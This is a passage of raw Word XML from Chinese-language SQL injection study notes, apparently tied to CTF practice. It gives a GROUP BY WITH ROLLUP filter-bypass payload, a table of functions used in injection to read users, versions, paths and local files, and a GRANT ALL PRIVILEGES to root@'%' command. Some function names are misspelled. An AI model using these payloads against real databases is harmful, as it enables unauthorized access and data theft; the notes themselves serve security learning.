          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:t>特殊情况下利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>group by column with rollup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>可以生</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>成</w:t>
      </w:r>
      <w:r>
        <w:t>一条</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>column=NULL</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="00C168B8">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>汇总</w:t>
      </w:r>
      <w:r w:rsidR="00C168B8">
        <w:t>数据</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>元组</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>再利用</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>其取出。此时</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不仅</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>可以确定</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>column</w:t>
      </w:r>
      <w:r w:rsidR="009C3B59">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>列的</w:t>
      </w:r>
      <w:r w:rsidR="009C3B59">
        <w:t>值为</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidR="009C3B59">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidR="009C3B59">
        <w:t>空值，不是字符串</w:t>
      </w:r>
      <w:r w:rsidR="009C3B59">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidR="009C3B59">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>并且取出了一条可能有用</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>元组（</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>group</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>之后</w:t>
      </w:r>
      <w:r w:rsidR="00A10587">
        <w:t>的汇总）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00501516" w:rsidRDefault="00501516" w:rsidP="005B6217">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>例如</w:t>
      </w:r>
      <w:r>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00501516">
        <w:t>key1=' or 1=1 group by key2 with rollup limit 1 offset 1#&amp;key2=</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00501516" w:rsidRDefault="00501516" w:rsidP="005B6217">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>可以</w:t>
      </w:r>
      <w:r>
        <w:t>绕过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>下图（</w:t>
      </w:r>
      <w:r>
        <w:t>美男子</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ctf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:t>中的过滤：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00501516" w:rsidRPr="00501516" w:rsidRDefault="00501516" w:rsidP="00E43E47">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="659E0D04" wp14:editId="618B1F03">
            <wp:extent cx="4981575" cy="1666875"/>
            <wp:effectExtent l="19050" t="19050" r="28575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6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3B72" w:rsidRDefault="009F61D1" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="009F61D1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="009F61D1">
        <w:t>注入时常用的函数命令</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A71DCA" w:rsidRPr="00A71DCA" w:rsidRDefault="00A71DCA" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通用函数</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="4"/>
        <w:tblW w:w="5000" w:type="pct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990028" w:rsidTr="00E379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90028" w:rsidRDefault="00990028" w:rsidP="009F61D1"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2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00990028" w:rsidRDefault="00990028" w:rsidP="009F61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system_user()</w:t>
            </w:r>
            <w:r w:rsidRPr="00990028">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:tab/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系统用户名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user()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="009F61D1" w:rsidRPr="00990028" w:rsidRDefault="009F61D1" w:rsidP="009900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用户名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current_user</w:t>
            </w:r>
            <w:r w:rsidR="008F0FFA">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>()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当前用户名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session_user()</w:t>
            </w:r>
            <w:r w:rsidRPr="00990028">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:tab/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连接数据库的用户名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database()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数据库名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version()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MYSQL</w:t>
            </w:r>
            <w:r w:rsidRPr="00990028">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>数据库版本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load_file()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="009F61D1" w:rsidRPr="00990028" w:rsidRDefault="009F61D1" w:rsidP="009900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MYSQL</w:t>
            </w:r>
            <w:r w:rsidRPr="00990028">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>读取本地文件的函数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@@datadir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读取数据库路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009F61D1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5954FE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 xml:space="preserve">@@basedir </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="009F61D1" w:rsidRPr="00990028" w:rsidRDefault="005954FE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MYSQL</w:t>
            </w:r>
            <w:r w:rsidR="009F61D1" w:rsidRPr="00990028">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>安装路径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rFonts w:hint="eastAsia"/>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>@@version_compile_os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0028">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>操作系统</w:t>
            </w:r>
            <w:r w:rsidRPr="00990028">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t xml:space="preserve"> Windows Server 2003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00500A6C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500A6C" w:rsidRDefault="00500A6C" w:rsidP="009F61D1">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>mid</w:t>
            </w:r>
            <w:r w:rsidR="0001730E">
              <w:t>(</w:t>
            </w:r>
            <w:r w:rsidR="00167C97">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>string</w:t>
            </w:r>
            <w:r w:rsidR="0001730E">
              <w:t>,start[,length])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00500A6C" w:rsidRPr="0001730E" w:rsidRDefault="00167C97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从字符串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位起，顺序取其</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>length</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>位。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开始计数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00500A6C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500A6C" w:rsidRDefault="00282253" w:rsidP="009F61D1">
            <w:r>
              <w:t>left(‘string’,num)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00500A6C" w:rsidRPr="00990028" w:rsidRDefault="00167C97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</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>字符串</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>string</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>左边</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>num</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>位，不区分大小写</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00785D8D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785D8D" w:rsidRDefault="00785D8D" w:rsidP="009F61D1">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>group_concate(column</w:t>
            </w:r>
            <w:r>
              <w:t>_name)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00785D8D" w:rsidRDefault="00785D8D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经常和</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>group by</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>一起使用，自动根据规则将列值拼接成一个字符串</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00785D8D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785D8D" w:rsidRDefault="00785D8D" w:rsidP="009F61D1">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>concate(str1,str2,str3,</w:t>
            </w:r>
            <w:r>
              <w:t>…)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00785D8D" w:rsidRPr="00785D8D" w:rsidRDefault="00785D8D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将多个字符串拼接为一个，界定符为逗号（，）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00785D8D" w:rsidTr="00E379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785D8D" w:rsidRDefault="00785D8D" w:rsidP="009F61D1">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>concate_ws(delimiter,str1,str2,</w:t>
            </w:r>
            <w:r>
              <w:t>…)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00785D8D" w:rsidRPr="00785D8D" w:rsidRDefault="00785D8D" w:rsidP="009F6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指定界定符，将多个字符串拼接</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009F61D1" w:rsidTr="00E379F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:rsidR="009F61D1" w:rsidRPr="00990028" w:rsidRDefault="009F61D1" w:rsidP="009F61D1">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00990028">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="009F61D1" w:rsidRPr="00990028" w:rsidRDefault="009F61D1" w:rsidP="009F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73C62" w:rsidRDefault="008C7807" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>substr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数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532"/>
        <w:gridCol w:w="3351"/>
      </w:tblGrid>
      <w:tr w:rsidR="008C7807" w:rsidTr="007153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8C7807" w:rsidRDefault="008C7807" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>数据库</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="008C7807" w:rsidRDefault="008C7807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3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="008C7807" w:rsidRDefault="008C7807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077D92" w:rsidTr="007153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77D92" w:rsidRPr="00990028" w:rsidRDefault="00077D92" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>MySQL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00077D92" w:rsidRPr="00990028" w:rsidRDefault="00077D9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substr(‘string’,start[,length])</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>，</w:t>
            </w:r>
            <w:r>
              <w:t>substr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>ing</w:t>
            </w:r>
            <w:r>
              <w:t>(‘string’,start[,length])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
            <w:vMerge w:val="restart"/>
          </w:tcPr>
          <w:p w:rsidR="00077D92" w:rsidRPr="00990028" w:rsidRDefault="00077D9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从字符串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的第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位起，顺序取其</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>length</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>位。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开始计数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00077D92" w:rsidTr="007153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77D92" w:rsidRPr="00990028" w:rsidRDefault="00077D92" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>SQL Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00077D92" w:rsidRPr="00990028" w:rsidRDefault="00077D92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substr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>ing</w:t>
            </w:r>
            <w:r>
              <w:t>(‘string’,start[,length])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
            <w:vMerge/>
          </w:tcPr>
          <w:p w:rsidR="00077D92" w:rsidRPr="00990028" w:rsidRDefault="00077D92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7D92" w:rsidTr="007153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77D92" w:rsidRPr="00990028" w:rsidRDefault="00077D92" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>Oracle</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00077D92" w:rsidRPr="00990028" w:rsidRDefault="00077D9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substr(‘string’,start[,length])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
            <w:vMerge/>
          </w:tcPr>
          <w:p w:rsidR="00077D92" w:rsidRPr="00990028" w:rsidRDefault="00077D9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C7807" w:rsidRDefault="00D801D9" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ascii</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数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532"/>
        <w:gridCol w:w="3351"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D801D9" w:rsidTr="00812A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Default="00D801D9" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>数据库</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRDefault="00D801D9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3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRDefault="00D801D9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D801D9" w:rsidTr="00812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Pr="00990028" w:rsidRDefault="00D801D9" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>MySQL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRPr="00990028" w:rsidRDefault="0024368F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asci(‘char’)</w:t>
            </w:r>
            <w:r w:rsidR="00EA2744">
              <w:t>,ord(‘char’)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRDefault="0024368F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返回</w:t>
            </w:r>
            <w:r>
              <w:t>’char’</w:t>
            </w:r>
            <w:r w:rsidR="00D91C11">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>第一个</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>字符的十进制</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>ascii</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>码。</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0024368F" w:rsidRPr="00990028" w:rsidRDefault="0024368F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反向函数为</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>char(FF,FF,FD,FE)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D801D9" w:rsidTr="0024368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Pr="00990028" w:rsidRDefault="00D801D9" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>SQL Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRPr="00990028" w:rsidRDefault="00D801D9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  <w:shd w:val="clear" w:color="auto" w:fill="CCCCCC" w:themeFill="text1" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRPr="00990028" w:rsidRDefault="00D801D9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01D9" w:rsidTr="00812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801D9" w:rsidRPr="00990028" w:rsidRDefault="00D801D9" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>Oracle</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRPr="00990028" w:rsidRDefault="00D801D9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</w:tcPr>
          <w:p w:rsidR="00D801D9" w:rsidRPr="00990028" w:rsidRDefault="00D801D9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801D9" w:rsidRDefault="00A55EF3" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>hex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>等进制转换函数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3532"/>
        <w:gridCol w:w="3351"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CE2D8A" w:rsidTr="00812A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Default="00CE2D8A" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>数据库</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRDefault="00CE2D8A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函数</w:t>
            </w:r>
            <w:r>
              <w:t>或命令</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRDefault="00CE2D8A" w:rsidP="00812A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注释</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CE2D8A" w:rsidTr="00812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Pr="00990028" w:rsidRDefault="00CE2D8A" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>MySQL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRDefault="00532934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bin</w:t>
            </w:r>
            <w:r>
              <w:t>(num)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00532934" w:rsidRDefault="00532934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oct(num)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00532934" w:rsidRPr="00990028" w:rsidRDefault="00532934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hex(num)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRDefault="00974D4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二进制</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00974D42" w:rsidRDefault="00974D4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八进制</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00974D42" w:rsidRPr="00990028" w:rsidRDefault="00974D42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十六</w:t>
            </w:r>
            <w:r w:rsidR="005E7A43">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>进制</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CE2D8A" w:rsidTr="00812AA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Pr="00990028" w:rsidRDefault="00CE2D8A" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>SQL Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRPr="00990028" w:rsidRDefault="00CE2D8A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  <w:shd w:val="clear" w:color="auto" w:fill="CCCCCC" w:themeFill="text1" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRPr="00990028" w:rsidRDefault="00CE2D8A" w:rsidP="00812A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2D8A" w:rsidTr="00812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E2D8A" w:rsidRPr="00990028" w:rsidRDefault="00CE2D8A" w:rsidP="00812AAA">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>Oracle</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3532" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRPr="00990028" w:rsidRDefault="00CE2D8A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351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A" w:rsidRPr="00990028" w:rsidRDefault="00CE2D8A" w:rsidP="00812A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A55EF3" w:rsidRPr="00A55EF3" w:rsidRDefault="00A55EF3" w:rsidP="00A55EF3"/>
    <w:p w:rsidR="009F61D1" w:rsidRDefault="004C14EA" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>变换</w:t>
      </w:r>
      <w:r>
        <w:t>请求方式绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F61D1" w:rsidRDefault="004C14EA" w:rsidP="009F61D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在提交数据的时候有两种方式，第一种方式是使用</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>urlencode</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的方式提交，第二种方式是使用</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
